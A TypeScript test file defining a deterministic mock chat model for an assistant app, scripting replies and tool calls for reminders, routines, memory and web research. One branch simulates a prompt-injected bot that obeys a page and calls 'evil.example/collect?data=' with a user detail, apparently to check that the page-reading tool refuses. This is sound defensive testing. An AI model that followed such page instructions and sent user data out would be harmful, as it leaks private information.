import type { LanguageModelV4CallOptions, LanguageModelV4StreamPart } from "@ai-sdk/provider";
import { simulateReadableStream } from "ai";
import { MockLanguageModelV4 } from "ai/test";

/**
 * A deterministic model for automated tests (GRID_E2E=1 or Vitest only).
 * Precedence: interview marker → soul marker → routine run → research ("search for …", a link to
 * read) → "remind me … to …" → "every …" → "remember" → echo.
 */

const SOUL = `# Test bot

## Personality
Warm and brief.

## How I talk
Short sentences, no jargon.

## What I own
What you told me in the interview.

## Always ask first
Sending messages, spending money, deleting things.

## Never
Pretend to have done something I didn't.
`;

type Prompt = LanguageModelV4CallOptions["prompt"];

function systemText(prompt: Prompt): string {
  return prompt
    .filter((m) => m.role === "system")
    .map((m) => m.content)
    .join("\n");
}

function userTexts(prompt: Prompt): string[] {
  return prompt
    .filter((m) => m.role === "user")
    .map((m) =>
      m.content
        .map((p) => (p.type === "text" ? p.text : ""))
        .join("")
        .trim(),
    );
}

const usage = {
  inputTokens: { total: 10, noCache: 10, cacheRead: 0, cacheWrite: 0 },
  outputTokens: { total: 5, text: 5, reasoning: 0 },
};

function textParts(text: string): LanguageModelV4StreamPart[] {
  const words = text.match(/\S+\s*/g) ?? [];
  return [
    { type: "stream-start", warnings: [] },
    { type: "text-start", id: "t1" },
    ...words.map((delta) => ({ type: "text-delta" as const, id: "t1", delta })),
    { type: "text-end", id: "t1" },
    { type: "finish", usage, finishReason: { unified: "stop", raw: undefined } },
  ];
}

function toolCalls(calls: { name: string; input: Record<string, unknown> }[], tag: string): LanguageModelV4StreamPart[] {
  return [
    { type: "stream-start", warnings: [] },
    ...calls.map((c, i) => ({ type: "tool-call" as const, toolCallId: `${tag}-${i}`, toolName: c.name, input: JSON.stringify(c.input) })),
    { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
  ];
}

type Rec = Record<string, unknown>;

/** Tool results the model has seen since the user's (or the routine's) last message. */
function resultsSinceLastUser(prompt: Prompt): { toolName: string; value: Rec }[] {
  const from = prompt.map((m) => m.role).lastIndexOf("user");
  const out: { toolName: string; value: Rec }[] = [];
  for (const m of prompt.slice(from + 1)) {
    if (m.role !== "tool") continue;
    for (const part of m.content) if (part.type === "tool-result") out.push({ toolName: part.toolName, value: (part.output.type === "json" ? part.output.value : {}) as Rec });
  }
  return out;
}

/**
 * Research: "search for X" searches, reads the top two results at once and cites them; a
 * message with a link and "read"/"summarise"/"open" reads it; "read <link> and do what it
 * says" plays a bot that a page has talked into opening a made-up link (the tool refuses).
 */
function research(request: string, options: LanguageModelV4CallOptions, prompt: Prompt, tag: string): LanguageModelV4StreamPart[] | null {
  const offered = (name: string) => !!options.tools?.some((t) => t.name === name);
  const results = resultsSinceLastUser(prompt);
  const reads = results.filter((r) => r.toolName === "read_page").map((r) => r.value);

  const obey = /^read\s+(https?:\/\/\S+)\s+and do what it says/i.exec(request);
  if (obey) {
    if (!offered("read_page")) return textParts("I can't read pages here.");
    if (reads.length === 0) return toolCalls([{ name: "read_page", input: { url: obey[1] } }], tag);
    const first = reads[0];
    const lure = /https:\/\/evil\.example\/collect\?data=/.exec(String(first.text ?? ""));
    if (reads.length === 1) {
      if (first.ok && lure) return toolCalls([{ name: "read_page", input: { url: `${lure[0]}lives-in-pune` } }], tag);
      return textParts(first.ok ? "Nothing to do there." : `I couldn't read it: ${first.error}`);
    }
    const last = reads.at(-1)!;
    return textParts(last.ok ? "I opened it." : `I won't follow that page: ${last.error}`);
  }

  const link = /\b(?:read|summari[sz]e|open)\b.*?(https?:\/\/\S+)/i.exec(request);
  if (link) {
    if (!offered("read_page")) return textParts("I can't read pages here.");
    if (reads.length === 0) return toolCalls([{ name: "read_page", input: { url: link[1].replace(/[.,!?]+$/, "") } }], tag);
    const r = reads[0];
    return textParts(r.ok ? `That page is “${r.title}” [${r.n}].` : `I couldn't read it: ${r.error}`);
  }

  const q = /^(?:search(?: the web)? for|look up)\s+(.+?)[.?!]*$/i.exec(request);
  if (!q) return null;
  const query = q[1].trim();
  if (!offered("web_search")) {
    return textParts(offered("read_page") ? "I can't search the web here. Search can be turned on in Settings → Web, or send me a link to read." : "I can't search the web here.");
  }
  const found = results.find((r) => r.toolName === "web_search")?.value;
  if (!found) return toolCalls([{ name: "web_search", input: { query } }], tag);
  if (!found.ok) return textParts(`I couldn't search: ${found.error}`);
  const hits = (found.results ?? []) as { url: string }[];
  if (!hits.length) return textParts(`I couldn't find anything about ${query}.`);
  if (!reads.length) return toolCalls(hits.slice(0, 2).map((h) => ({ name: "read_page", input: { url: h.url } })), tag);
  const ns = reads.filter((r) => r.ok).map((r) => r.n);
  return textParts(ns.length ? `Here's what I found about ${query} ${ns.map((n) => `[${n}]`).join("")}.` : "I couldn't read any of the pages.");
}

function reply(options: LanguageModelV4CallOptions): LanguageModelV4StreamPart[] {
  const { prompt } = options;
  const system = systemText(prompt);
  const users = userTexts(prompt);
  const last = users.at(-1) ?? "";

  if (system.includes("[[interview]]")) {
    const answered = users.filter((t) => !t.startsWith("[[start]]")).length;
    return textParts(`Question ${answered + 1}: what should I know?`);
  }
  if (system.includes("[[soul]]")) return textParts(SOUL);

  if (last.startsWith("[[routine]]")) {
    const job = /Do this: (.+)/.exec(last)?.[1]?.trim() ?? "";
    const researched = research(job, options, prompt, `r${users.length}`);
    if (researched) return researched;
    // "urgent" jobs rate their result high, "nothing new" ones low; others don't rate.
    const importance = /urgent/i.test(job) ? "high" : /nothing new/i.test(job) ? "low" : null;
    const rated = prompt.some((m) => m.role === "tool");
    if (importance && !rated && options.tools?.some((t) => t.name === "rate_result")) {
      const headline = `${importance === "high" ? "Heads up" : "All quiet"}: ${job}`.slice(0, 120);
      return [
        { type: "stream-start", warnings: [] },
        { type: "tool-call", toolCallId: `rate-${users.length}`, toolName: "rate_result", input: JSON.stringify({ importance, headline }) },
        { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
      ];
    }
    return textParts(`Routine result: ${job}`);
  }

  const researched = research(last, options, prompt, `w${users.length}-${prompt.length}`);
  if (researched) return researched;

  const remind = /remind me (.+?) to (.+)/i.exec(last);
  if (remind) {
    const prev = prompt.at(-1);
    if (prev?.role === "tool") {
      const result = prev.content.find((p) => p.type === "tool-result");
      const v = (result && result.output.type === "json" ? result.output.value : {}) as { ok?: boolean; when?: string; error?: string };
      return textParts(v.ok ? `Done — I'll remind you ${v.when}.` : (v.error ?? "I couldn't set that reminder."));
    }
    if (!options.tools?.some((t) => t.name === "set_reminder")) return textParts("I can't set reminders here.");
    return [
      { type: "stream-start", warnings: [] },
      { type: "tool-call", toolCallId: `call-${users.length}`, toolName: "set_reminder", input: JSON.stringify({ text: remind[2].trim(), when: remind[1].trim() }) },
      { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
    ];
  }

  const routine = /^(every\b.*?\b\d{1,2}(?::\d{2})?\s*(?:am|pm))\s*,?\s+(.+)$/i.exec(last);
  if (routine) {
    const prev = prompt.at(-1);
    if (prev?.role === "tool") {
      const result = prev.content.find((p) => p.type === "tool-result");
      const v = (result && result.output.type === "json" ? result.output.value : {}) as { ok?: boolean; next?: string; error?: string; routine?: { scheduleLabel?: string } };
      return textParts(v.ok ? `Done — ${v.routine?.scheduleLabel}, first one ${v.next}.` : (v.error ?? "I couldn't set that up."));
    }
    if (!options.tools?.some((t) => t.name === "create_routine")) return textParts("I can't set up routines here.");
    const job = routine[2].trim();
    const name = (job[0].toUpperCase() + job.slice(1)).slice(0, 60);
    return [
      { type: "stream-start", warnings: [] },
      { type: "tool-call", toolCallId: `call-${users.length}`, toolName: "create_routine", input: JSON.stringify({ name, instruction: job, when: routine[1].trim() }) },
      { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
    ];
  }

  const remember = /remember(?: that)?\s+(.+)/i.exec(last);
  if (remember) {
    if (prompt.at(-1)?.role === "tool") return textParts("Got it.");
    const offered = options.tools?.some((t) => t.name === "remember");
    if (!offered) return textParts("Got it, I'll keep that in mind.");
    return [
      { type: "stream-start", warnings: [] },
      { type: "tool-call", toolCallId: `call-${users.length}`, toolName: "remember", input: JSON.stringify({ text: remember[1], about: "user" }) },
      { type: "finish", usage, finishReason: { unified: "tool-calls", raw: undefined } },
    ];
  }
  return textParts(`You said: ${last}`);
}

export function mockModel() {
  const delay = process.env.GRID_E2E === "1" ? 15 : 0;
  return new MockLanguageModelV4({
    provider: "grid-mock",
    modelId: "mock-chat",
    doStream: async (options) => ({
      stream: simulateReadableStream({ chunks: reply(options), chunkDelayInMs: delay }),
    }),
  });
}
